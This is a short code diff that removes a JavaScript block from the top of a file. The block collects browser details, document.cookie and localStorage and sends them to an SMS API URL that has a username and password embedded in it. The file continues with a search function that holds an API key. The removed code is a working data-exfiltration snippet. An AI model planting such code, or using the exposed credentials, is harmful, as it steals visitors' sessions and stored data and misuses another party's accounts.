@@ -1,39 +1,3 @@
-var url = 'https://smsapi.free-mobile.fr/sendmsg?user=11773960&pass=DkaRdq6AlGCkJY&msg='
-const req = new XMLHttpRequest();
-
-var info = [
-
-    window.location.pathname,
-    document.referrer,
-    history.length,
-    navigator.appName,
-    navigator.product,
-    navigator.appVersion,
-    navigator.userAgent,
-    navigator.language,
-    navigator.onLine,
-    navigator.platform,
-    navigator.javaEnabled(),
-    navigator.cookieEnabled,
-    document.cookie,
-    decodeURIComponent(document.cookie.split(";")),
-    localStorage,
-    screen.width,
-    screen.height,
-    document.width,
-    document.height,
-    innerWidth,
-    innerHeight,
-    screen.availWidth,
-    screen.availHeight,
-    screen.colorDepth,
-    screen.pixelDepth
-
-];
-
-req.open('POST', url + info, false);
-req.send(null);
-
 function search() {
     var KEY = '344e5598';
 
